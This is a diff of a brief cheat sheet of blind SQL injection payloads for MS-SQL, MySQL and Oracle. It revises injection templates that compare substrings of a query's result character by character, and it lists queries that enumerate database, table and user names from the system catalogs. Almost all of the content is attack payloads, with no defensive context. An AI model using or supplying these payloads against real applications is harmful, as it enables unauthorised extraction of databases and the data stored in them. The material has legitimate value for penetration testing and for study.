@@ -1,6 +1,6 @@
 <h2>[MS-SQL]</h2> <br>
 # Shape <br>
-select * from board where Title='//' and substring((query), 1, 1) < 'a'--<br>
+//' and substring((query), 1, 1) < 'a'--<br>
 ???' and substring((query), 1, 1) < 'a'--<br>
 <br>
 # get DB NAME <br>
@@ -19,7 +19,7 @@ select top 1 [Column Name] from [Table Name] <br>
 <br>
 <h2>[MySQL]</h2> <br>
 # Shape <br>
-???' and ascii(substring((query), 1, 1)) > 'a'# <br>
+???' and ascii(substr((query), 1, 1)) > 'a'# <br>
 <br>
 # Get Table Name <br>
 select table_name from information_schema.tables where table_type='base table' limit 0,1 <br>
@@ -29,7 +29,7 @@ select table_name from information_schema.tables where table_type='base table' l
 <br>
 <h2>[Oracle]</h2> <br>
 #Shape <br>
-and (ascii(SUBSTR(select username from all_users where rownum = 1),1,1))) > 1<br>
+and (ascii(SUBSTR(query),1,1))) > 1--<br>
 <br>
 #Get DB name <br>
 select DISTINCT owner FROM all_tables;<br>
